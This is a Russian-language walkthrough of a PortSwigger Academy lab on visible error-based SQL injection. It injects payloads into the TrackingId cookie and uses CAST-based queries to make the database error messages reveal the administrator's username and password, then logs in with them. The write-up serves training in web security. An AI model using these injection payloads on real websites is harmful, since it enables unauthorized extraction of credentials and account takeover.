Перейдем на страницу логина и найдем данный запрос в `Proxy` -> `HTTP history` и отправим его в `Repeater`
```
GET /login
...
Cookie: TrackingId=k6peAB6wjnaccVDM
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/1.png)
Добавим `'` в заголовок Cookie, и посмотрим как сервер обработает наш запрос
```
Cookie: TrackingId=k6peAB6wjnaccVDM';
```
В ответе на главной странице видим явную ошибку SQL запроса. Соответсвенно, делаем вывод о возможности SQL-инъекции
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/2.png)
Далее заккоментируем остаток SQL запроса, и видим, что сервер полностью обработал наш запрос, и не выдает никакой ошибки
```
Cookie: TrackingId=k6peAB6wjnaccVDM'--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/3.png)

В данной лабораторной работе мы заставляем приложение сгенерировать сообщение об ошибке, содержащее данные, возвращаемые запросом. Это эффективно превращает слепую уязвимость SQL-инъекции в видимую.

Используем функцию `CAST()` для достижения этой цели. Она позволяет нам преобразовывать один тип данных в другой
```
Cookie: TrackingId=k6peAB6wjnaccVDM'AND CAST((SELECT 1) AS int)--
```
Тем самым узнаем, что аргумент после AND должен быть типа `boolean`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/4.png)
Изменим запрос, чтобы аргумент был типа `boolean`
```
Cookie: TrackingId=k6peAB6wjnaccVDM'AND 1=CAST((SELECT 1) AS int)--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/5.png)
Отлично. По заданию нам известно, что существует таблица `user`, в которой есть `username`, `password`. Воспользуемся данными знаниями.
```
Cookie: TrackingId=k6peAB6wjnaccVDM'AND 1=CAST((SELECT username FROM users) AS int)--;
```
Видим, что в таблице содержится больше 1 возвращаемой строки
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/6.png)
Ограничим количество выводимых строк до 1
```
Cookie: TrackingId='AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--;
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/7.png)
Отлично, на прошлом шаге мы добрались до username `administrator`. Самое время добраться до его пароля
```
Cookie: TrackingId='AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--;
```
и видим, что его пароль - `pgznj365yl2136mm4521`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/8.png)
И на финальном этапе логинимся под УЗ `administrator:pgznj365yl2136mm4521` и получаем уведомление об успешно выполненной лабораторной работе    
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/9.%20Visible%20error-based%20SQL%20injection/pics%20for%20walktrough/9.png)
